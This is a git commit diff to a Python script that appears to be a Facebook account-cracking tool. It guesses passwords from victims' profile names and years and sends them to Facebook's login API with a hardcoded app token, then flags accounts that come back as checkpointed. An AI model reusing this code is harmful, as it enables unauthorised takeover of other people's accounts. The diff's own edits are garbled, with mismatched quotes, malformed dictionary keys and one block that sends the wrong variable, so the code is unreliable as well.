ef31e7eeb687929c6e53022e0e2b1c5b75314087
H3MRX <52018941+H3MRX@users.noreply.github.com>
2019-06-20 09:30:20 +0700

    Update and rename beta.py.enc to beta.py

--- beta.py
+++ beta.py
@@ -642,7 +642,7 @@ def pilih_super():
 										if 'www.facebook.com' in q['error_msg']:
 											print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass4
 										else:
-											pass5 = b['first_name'] + '1997'
+											pass5 = b['first_name + birthday']
 											data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 											q = json.load(data)
 											if 'access_token' in q:
@@ -651,7 +651,7 @@ def pilih_super():
 												if 'www.facebook.com' in q['error_msg']:
 													print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass5
 												else:
-													pass6 = b[first_name + last_name' +123
+													pass6 = b[first_name + last_name'] +123
 													data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 													q = json.load(data)
 													if 'access_token' in q:
@@ -700,7 +700,7 @@ def pilih_super():
 
 
 else:
-													pass11 = b[first_name + last_name' +12345
+													pass11 = b[first_name + last_name'] +12345
 													data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 													q = json.load(data)
 													if 'access_token' in q:
